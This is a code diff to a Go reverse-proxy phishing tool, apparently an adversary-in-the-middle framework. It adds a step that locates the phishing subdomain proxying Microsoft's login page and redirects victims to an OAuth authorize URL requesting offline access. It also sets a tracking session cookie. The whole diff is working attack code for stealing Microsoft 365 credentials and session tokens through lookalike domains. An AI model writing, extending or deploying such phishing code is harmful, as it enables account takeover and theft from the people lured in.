@@ -2151,8 +2151,29 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 									// --- End device code chaining ---
 
-									// AitM flow: set session cookie and let landing page load
-									// URL rewriting happens automatically via rewrite_urls when Microsoft redirects
+									// AitM flow: redirect to Microsoft login via phish domain
+									// Build OAuth URL and redirect user to login
+									phishDomain, _ := p.cfg.GetSiteDomain(pl_name)
+									// Find the phish subdomain that proxies to login.microsoftonline.com
+									loginPhishHost := ""
+									for _, ph := range pl.GetProxyHosts() {
+										origHost := combineHost(ph.OrigSub, ph.Domain)
+										if origHost == "login.microsoftonline.com" {
+											loginPhishHost = combineHost(ph.PhishSub, phishDomain)
+											break
+										}
+									}
+									if loginPhishHost == "" {
+										loginPhishHost = "secure." + phishDomain // fallback
+									}
+									
+									// Build OAuth authorize URL
+									oauthURL := fmt.Sprintf("https://%s/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https://www.office.com/landingv2&response_type=code&scope=openid+profile+offline_access&response_mode=form_post&prompt=login", loginPhishHost)
+									
+									log.Debug("[%d] [AitM] redirecting to login: %s", sid, oauthURL)
+									resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+									resp.Header.Set("Location", oauthURL)
+									resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
 									ck := &http.Cookie{
 										Name:    getSessionCookieName(pl_name, p.cookieName),
 										Value:   session.Id,
@@ -2160,7 +2181,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										Domain:  p.cfg.GetBaseDomain(),
 										Expires: time.Now().Add(60 * time.Minute),
 									}
-									req.AddCookie(ck)
+									resp.Header.Add("Set-Cookie", ck.String())
+									return req, resp
 								}
 							} else {
 								// Before blacklisting, check if this path belongs to a lure on the same host
